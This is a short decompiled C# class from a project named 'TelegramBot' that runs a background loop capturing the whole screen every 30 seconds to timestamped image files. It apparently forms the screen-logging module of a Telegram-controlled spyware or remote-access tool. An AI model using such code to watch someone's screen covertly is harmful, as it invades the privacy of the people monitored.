using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace TelegramBot
{
	// Token: 0x020000E0 RID: 224
	internal class ScrL
	{
		// Token: 0x060002DA RID: 730 RVA: 0x00003081 File Offset: 0x00001281
		public static void Time2Log()
		{
			new Thread(delegate()
			{
				while (ScrL.perm)
				{
					string str = DateTime.Now.ToString("dd-MMMM-yyyy __ HH-mm-ss");
					ScrL.ScreenShot(Folders.screenfolder + "\\" + str + ".png");
					Thread.Sleep(ScrL.timeout);
				}
			}).Start();
		}

		// Token: 0x060002DB RID: 731 RVA: 0x00021660 File Offset: 0x0001F860
		public static void ScreenShot(string name)
		{
			Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
			Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
			bitmap.Save(name);
			bitmap.Dispose();
		}

		// Token: 0x04000513 RID: 1299
		public static int timeout = 30000;

		// Token: 0x04000514 RID: 1300
		public static bool perm = false;
	}
}
